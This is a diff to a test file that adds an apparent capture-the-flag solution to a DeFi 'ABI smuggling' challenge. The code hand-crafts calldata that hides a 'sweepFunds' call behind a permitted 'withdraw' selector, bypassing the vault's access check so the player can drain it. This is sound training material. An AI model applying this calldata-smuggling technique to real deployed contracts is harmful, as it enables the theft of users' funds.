@@ -45,6 +45,53 @@ describe('[Challenge] ABI smuggling', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        /** step 1: Recreate and Verify key function sig */
+        let abi = [`function execute(address, bytes)`];
+        let iface = new ethers.utils.Interface(abi);
+        let sig = iface.getSighash("execute");
+        console.log(sig);
+
+        abi = [`function sweepFunds(address, address)`];
+        iface = new ethers.utils.Interface(abi);
+        sig = iface.getSighash("sweepFunds");
+        console.log(sig);
+
+        abi = [`function withdraw(address, address,uint256)`];
+        iface = new ethers.utils.Interface(abi);
+        sig = iface.getSighash("withdraw");
+        console.log(sig);
+
+        /** step 2: prepare nested msg.data; function sweepFunds is nested behind function withdraw */
+        abi = ethers.utils.defaultAbiCoder;
+        let params1 = "0x1cff79cd";
+        let params2 = abi.encode(["address", "uint256"], [vault.address, 100]);
+        let params3 = ethers.utils.hexZeroPad("0x0", 32);
+        let params4 = "0xd9caed12";
+        //Acutal bytes 'actiondata' contents starts here
+        let params5 = abi.encode(["uint256"], [68]);
+        abi = ["function sweepFunds(address,address)"];
+        iface = new ethers.utils.Interface(abi);
+        let params6 = iface.encodeFunctionData("sweepFunds", [
+            recovery.address,
+            token.address,
+        ]);
+        let params = ethers.utils.hexConcat([
+            params1,
+            params2,
+            params3,
+            params4,
+            params5,
+            params6,
+        ]);
+        console.log(params);
+        /**step 3: execute */
+        let tx = {
+            from: player.address,
+            to: vault.address,
+            data: params,
+            gasLimit: 3000000,
+        };
+        await player.sendTransaction(tx);
     });
 
     after(async function () {
